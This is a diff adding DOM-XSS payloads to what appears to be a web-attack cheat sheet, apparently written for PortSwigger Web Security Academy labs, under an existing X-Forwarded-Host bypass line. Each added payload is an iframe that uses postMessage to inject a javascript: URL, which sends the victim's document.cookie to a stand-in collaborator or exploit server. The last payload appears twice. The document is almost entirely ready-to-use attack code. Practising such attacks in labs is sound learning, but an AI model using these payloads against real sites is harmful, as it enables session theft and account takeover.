@@ -131,3 +131,34 @@ Bypass validate host
 ```
 X-Forwarded-Host: <exploit-host>?<origin host>
 ```
+
+DOM-XSS
+
+```html
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location=\'https://COLLABORATOR.com?c='+document.cookie+'\'"
+}), "*");'>
+```
+
+OR
+
+```html
+<iframe src="TARGET" onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:fetch(`https:\/\/EXPLOIT-SERVER/?c=`.concat(document.cookie))\"}","*")'></iframe>
+```
+
+OR
+
+```html
+<iframe src=https://0aa900e203dee0d380c30d6e006e0031.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location=`https://exploit-0ad100f9036fe08d80e30c7001a50030.exploit-server.net/?c=`+document.cookie"
+}), "*");'>
+```
+
+```html
+<iframe src=https://0aa900e203dee0d380c30d6e006e0031.web-security-academy.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location=`https://exploit-0ad100f9036fe08d80e30c7001a50030.exploit-server.net/?c=`+document.cookie"
+}), "*");'>
+```
